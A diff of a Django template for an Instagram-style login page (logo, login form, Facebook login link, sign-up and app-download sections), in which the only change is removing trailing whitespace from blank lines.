@@ -13,7 +13,7 @@
 <body>
 
   <div id="content-container">
-      
+
     <section class="phones">
       <img src="{% static 'images/phones.png' %}" alt="pictures on phone" class="phone-image">
       <div class="display-phone">
@@ -24,15 +24,15 @@
         <img class="picture" src="{% static 'images/photo-5.png' %}" alt="#">
       </div>
     </section>
-      
+
     <section class="user">
 
       <div class="login-container">
-          
+
         <div class="instagram-logo-box">
           <img class="instagram-logo" src="{% static 'images/instagram-logo.png' %}">
         </div>
-          
+
         <form id="login-post" action="{% url 'login' %}" method="post">
             {% csrf_token %}
           <div class="inputs-container">
@@ -48,21 +48,21 @@
             <div class="or">OR</div>
             <div class="line"></div>
           </div>
-            
+
           <div class="facebook-container">
             <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
                 src="{% static 'images/facebook-logo.png' %}">Log in
               with Facebook</a>
           </div>
         </form>
-          
+
         <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
       </div>
-        
+
       <div class="signup-container">
         <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
       </div>
-        
+
       <div class="get-container">
         <p>Get the app.</p>
         <div class="download-container">
